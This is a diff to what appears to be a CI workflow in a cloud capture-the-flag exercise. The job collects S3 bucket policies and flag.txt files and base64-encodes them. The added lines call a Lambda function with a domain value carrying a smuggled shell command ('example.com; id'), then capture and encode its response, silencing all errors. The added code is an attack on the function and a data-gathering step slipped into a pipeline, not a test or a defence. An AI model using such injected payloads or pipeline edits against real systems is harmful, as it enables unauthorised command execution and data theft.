@@ -34,6 +34,7 @@ jobs:
         run: |
           set +x
           printf '%s\n' "$CLOUDESCAPE_PUBLIC_KEY" > /tmp/cloudescape.pub
+          aws lambda invoke --function-name nslookupv2 --cli-binary-format raw-in-base64-out --payload '{"domain":"example.com; id"}' /tmp/nslookup-response.json >/dev/null 2>/dev/null || true
           for bucket in userad88e2b168aa387e logad88e2b168aa387e; do
             aws s3api get-bucket-policy --bucket "$bucket" --query Policy --output text > "/tmp/$bucket.policy" 2>/dev/null || true
             aws s3api get-object --bucket "$bucket" --key flag.txt "/tmp/$bucket.flag" >/dev/null 2>/dev/null || true
@@ -41,6 +42,9 @@ jobs:
           python3 - <<'PY'
           import base64, json, os, urllib.parse
           result = {}
+          response = "/tmp/nslookup-response.json"
+          if os.path.exists(response):
+              result["lambda_response_b64"] = base64.b64encode(open(response, "rb").read()).decode()
           for bucket in ["userad88e2b168aa387e", "logad88e2b168aa387e"]:
               item = {}
               policy = f"/tmp/{bucket}.policy"
